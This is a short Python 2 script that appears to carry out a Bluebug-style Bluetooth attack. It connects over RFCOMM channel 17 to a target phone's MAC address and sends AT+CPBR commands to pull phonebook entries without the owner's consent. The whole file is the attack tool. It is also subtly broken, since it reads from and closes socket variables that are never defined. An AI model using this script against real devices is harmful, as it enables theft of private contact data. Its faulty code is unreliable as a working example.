import bluetooth
import sys

try:
    targetphone = sys.argv[1]
except:
    print "[!] Usage: [target phone MAC]"
    sys.exit(0)

port = 17

phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)

phoneSock.connect((targetphone, port))

for contact in range(1, 5):
    try:
        atCmd = 'AT+CPBR=' + str(contact) + '\n'
        phoneSock.send(atCmd)
        result = client_sock.recv(1024)
        print "[+] "+str(contact)+": "+result
    except KeyboardInterrupt:
        print "[*] Stop..."
        sys.exit(0)

sock.close()
